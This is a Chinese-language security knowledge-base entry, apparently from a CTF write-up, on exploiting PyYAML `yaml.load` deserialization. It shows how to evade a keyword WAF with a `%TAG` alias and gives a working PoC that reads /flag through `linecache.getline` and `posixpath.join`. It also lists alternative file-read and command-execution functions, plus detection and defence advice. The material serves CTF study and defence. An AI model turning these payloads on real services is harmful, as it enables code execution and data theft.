---
id: web-python-deser-pyyaml-tag-directive-waf-bypass-linecache
title: PyYAML %TAG 指令绕过关键字 WAF：linecache.getline + posixpath.join 读取 /flag
type: scenario
domain: web
path: web/python/deserialization
technique: pyyaml-tag-directive-waf-bypass-linecache
tags:
- web
- python
- pyyaml
- deserialization
- yaml
- waf-bypass
- linecache
- file-read
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V113
  verified_at: '2026-11-06T01:59:59+08:00'
  notes: 已对照原文喵喵宠物医院段核对：command字段进入YAML、WAF黑名单、%TAG !p! tag:yaml.org,2002:python/、linecache.getline+posixpath.join拼接/flag、两种payload与flag均一致。未验证点：PoC未本机复跑，原文未给后端解析代码；frontmatter无sources/source_url。
url: /docs/web/python/deserialization/web-python-deser-pyyaml-tag-directive-waf-bypass-linecache/
draft: false
kb_aliases:
- 喵喵宠物医院
- PyYAML 反序列化
- '%TAG 指令'
- '!!python/object/apply'
- linecache.getline
- posixpath.join
- WAF 关键字绕过
---

## 一句话结论

宠物医院把用户提交的 JSON 字段 `command` 交给 `yaml.load` 解析；WAF 拦截 `!!python`、`os.popen`、`os.system`、`subprocess`、`builtins`、`eval`、`exec`、`/flag`，但 YAML 的 `%TAG` 指令可以给 `tag:yaml.org,2002:python/` 起别名 `!p!`，从而构造不带 `!!python` 字面量的 `!p!object/apply:linecache.getline`。再用不在黑名单的 `linecache.getline` 读文件、用 `posixpath.join('/', 'flag')` 拼接路径避开 `/flag` 字面量，即可读取 flag。

## 原理

- **PyYAML 危险 Tag**：`yaml.load`（非 `safe_load`）支持 `!!python/object/apply:func`，会调用任意 Python 函数并传入 YAML 列表参数；常见 payload 是 `!!python/object/apply:os.popen ['cat /flag']`。
- **WAF 只做关键字匹配**：过滤 `!!python`、`os.popen`、`os.system`、`subprocess`、`builtins`、`eval`、`exec`、`/flag`，但没有解析 YAML tag URI 的等价写法。
- **%TAG 指令**：YAML 允许 `%TAG !p! tag:yaml.org,2002:python/` 声明标签前缀，`!p!object/apply:linecache.getline` 等价于 `tag:yaml.org,2002:python/object/apply:linecache.getline`；字面量里没有 `!!python`，绕过过滤。
- **linecache.getline**：`linecache.getline(path, lineno)` 只读文件并返回指定行，不执行命令；不在 WAF 黑名单。用 `posixpath.join('/', 'flag')` 构造 `/flag`，避免出现 `/flag` 字面量。
- **JSON 换行**：payload 作为 JSON 字符串提交，`\n` 必须是实际换行（Burp/Yakit 直接发），网页表单可能把 `\n` 转义成字面 `\n` 导致 YAML 解析失败。
- **为什么成立**：WAF 在 YAML 解析前做字符串匹配，而 YAML 的指令/标签展开发生在解析阶段；过滤层与解析层语义不一致。

## 触发条件

- 应用使用 `yaml.load`/`yaml.unsafe_load` 解析用户输入，且未使用 `SafeLoader`。
- WAF/黑名单只匹配字面量关键字，未做 YAML 语法解析/规范化。
- 目标环境有 `linecache`/`posixpath` 等标准库，且文件路径可读。
- 用户可控字段能进入 YAML 解析（如 `command`、配置、记录内容）。

## 利用步骤

1. 确认输入被 YAML 解析：提交 `!!python/object/apply:os.popen[id]`，观察是否被 WAF 拦截（说明有 YAML 解析面）。
2. 用 `%TAG !p! tag:yaml.org,2002:python/` + `!p!object/apply:...` 构造不含 `!!python` 的 payload，确认返回异常而不是 WAF 拦截。
3. 用 `linecache.getline` 读文件，用 `posixpath.join` 拼接路径避开 `/flag`；提交后读取回显。
4. 若被其他关键字拦截，换 `linecache.getlines`、`pathlib.Path.read_text`、`io.open` 等替代。

## PoC

```json
{"command": "%TAG !p! tag:yaml.org,2002:python/\n---\nname: !p!object/apply:linecache.getline [!p!object/apply:posixpath.join [/, flag], 1]"}
```

等价 YAML：

```yaml
%TAG !p! tag:yaml.org,2002:python/
---
name: !p!object/apply:linecache.getline
  - !p!object/apply:posixpath.join [/, flag]
  - 1
```

等价的 Python 调用：

```python
name = linecache.getline(posixpath.join("/", "flag"), 1)
```

## 变体与关联

- `%TAG` 前缀可换成 `!x!`、`!py!` 等任意句柄；也可用完整 `tag:yaml.org,2002:python/object/apply:...` 避免 `!!python`。
- 替代函数：`linecache.getlines`、`pathlib.Path('/flag').read_text`、`io.open`、`codecs.open`、`fileinput.input`；命令执行可用 `os.popen`、`subprocess` 的别名/间接引用。
- 若 `yaml.load` 已用 `SafeLoader`，该链失效；可寻找其他反序列化入口（pickle、jsonpickle、eval）。
- 关联：PyYAML 反序列化、WAF 关键字绕过、Python 文件读取卡。

## 检测与防御

- 使用 `yaml.safe_load`/`SafeLoader`，禁止 `!!python/*` 标签；不要对用户输入调用 `yaml.load`。
- WAF 应解析/规范化 YAML（展开 `%TAG`、tag URI），而不是只匹配字面量；对 `tag:yaml.org,2002:python` 全量拦截。
- 最小权限运行，flag 文件不可被 Web 进程读取；禁用不必要的标准库函数/模块。
- 检测：输入中出现 `%TAG`、`!p!`、`object/apply`、`linecache`、`posixpath`；YAML 解析异常/对象构造日志。
